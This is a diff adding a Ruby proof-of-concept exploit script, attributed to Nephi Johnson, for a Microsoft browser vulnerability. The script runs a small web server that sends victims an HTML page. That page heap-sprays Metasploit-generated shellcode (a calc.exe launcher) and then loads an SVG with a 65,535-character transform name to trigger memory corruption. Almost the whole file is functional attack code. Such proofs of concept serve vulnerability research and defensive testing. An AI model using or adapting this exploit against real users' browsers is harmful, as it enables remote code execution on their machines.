@@ -1,0 +1,127 @@
+#!/usr/bin/env ruby
+ 
+# http://breakingpointsystems.com/community/blog/microsoft-vulnerability-proof-of-concept
+# Nephi Johnson
+
+require 'socket'
+
+def http_send(sock, data, opts={})
+    defaults = {:code=>"200", :message=>"OK", :type=>"text/html", :desc=>"content"}
+    opts = defaults.merge(opts)
+    
+    code = opts[:code]
+    message = opts[:message]
+    type = opts[:type]
+    
+    date_str = Time.now.gmtime.strftime("%a, %d %b %Y %H:%M:%S GMT")
+    headers = "HTTP/1.1 #{code} #{message}\r\n" +
+              "Date: #{date_str}\r\n" +
+              "Content-Length: #{data.length}\r\n" +
+              "Content-Type: #{type}\r\n\r\n"
+    puts "[+] Sending #{opts[:desc]}"
+    sock.write(headers + data) rescue return false
+    return true
+end
+ 
+def sock_read(sock, out_str, timeout=5)
+    begin
+        if Kernel.select([sock],[],[],timeout)
+            out_str.replace(sock.recv(1024))
+            puts "[+] Received:"
+            puts "    " + out_str.split("\n")[0]
+            return true
+        else
+            sock.close
+            return false
+        end
+    rescue Exception => ex
+        return false
+    end
+end
+
+port = ARGV[0] || 55555
+
+transform_name = "\x21" * 65535
+
+svg = <<-SVG
+<?xml version="1.0"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"
+  "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+
+<svg xmlns="http://www.w3.org/2000/svg"
+    xmlns:xlink="http://www.w3.org/1999/xlink">
+
+    <rect x="50" y="50" height="110" width="110"
+          style="fill: #ffffff"
+          transform="#{transform_name}(10) translate(30) rotate(45 50 50)"
+            >
+    </rect>
+    <text x="100" y="100">CLICK ME</text>
+</svg>
+SVG
+
+html = <<-HTML
+<html>
+    <body>
+        <script>
+            <!--
+                function str_dup(str, length) {
+                    var result = str;
+                    while(result.length < length) {
+                        result += result;
+                    }
+                    return result.substr(result.length - length);
+                }
+
+                var shellcode = unescape("%u9000%u9090%u9090") +
+                                // msfpayload windows/exec CMD=calc.exe R | msfencode -t js_le -b "\x00"
+                                unescape("%u39ba%ue680%udb4f%u29dc%ub1c9%ud933%u2474%u58f4" +
+                                         "%u5031%u8313%u04c0%u5003%u6236%ub313%ueba0%u4cdc" +
+                                         "%u8c30%ua955%u9e01%ub902%u2e33%uef40%uc5bf%u0404" +
+                                         "%uab34%u2b80%u06fd%u02f7%ua6fe%uc837%ua83c%u13cb" +
+                                         "%u0a10%udbf5%u4b65%u0132%u1985%u4deb%u8e37%u1098" +
+                                         "%uaf8b%u1f4e%ud7b3%ue0eb%u6247%u30f5%uf9f7%ua8bd" +
+                                         "%ua57c%uc81d%ub551%u8362%u0ede%u1210%u5f36%u24d9" +
+                                         "%u0c76%u88e4%u4c7b%u2e20%u3b63%u4c5a%u3c1e%u2e99" +
+                                         "%uc9c4%u883c%u6a8f%u28e5%uec5c%u266e%u7a29%u2b28" +
+                                         "%uafac%u5742%u4e25%ud185%u757d%ub901%u1426%u6710" +
+                                         "%u2989%ucf42%u8c76%ue208%ub663%u6952%u3a72%ud4e9" +
+                                         "%u4474%u76f2%u751c%u1979%u8a5b%u5da8%uc093%uf4f1" +
+                                         "%u8d3b%u4563%u2e26%u8a5e%uad5e%u736b%uada5%u7619" +
+                                         "%u69e2%u0af1%u1c7b%ub9f5%u357c%u5c96%ud5ee%ufa77" +
+                                         "%u7c96%u0e88");
+                var base = str_dup(unescape("%u2100"), 0x800 - shellcode.length);
+                var arr = [];
+                for(var i = 0; i < 2000; i++) {
+                    arr[i] = document.createElement("a");
+                    arr[i].innerHTML = [base + shellcode].join("");
+                }
+            -->
+        </script>
+        <iframe width="100%" height="100%" src="poc.svg" marginheight="0" marginwidth="0"></iframe>
+    </body>
+</html>
+HTML
+
+puts "[+] Listening on port #{port}"
+puts
+
+TCPServer.open(port) do |srv|
+    while true
+        cli = srv.accept
+        req = ""
+        next unless sock_read(cli, req, 5)
+        while req.length > 0
+            if req =~ /GET.*svg/i
+                break unless http_send(cli, svg, :type=>"image/svg+xml", :desc=>"svg")
+            elsif req =~ /QUIT/
+                exit()
+            else
+                break unless http_send(cli, html, :type=>"text/html", :desc=>"html")
+            end
+            req = ""
+            next unless sock_read(cli, req, 5)
+        end
+        cli.close rescue next
+    end
+end
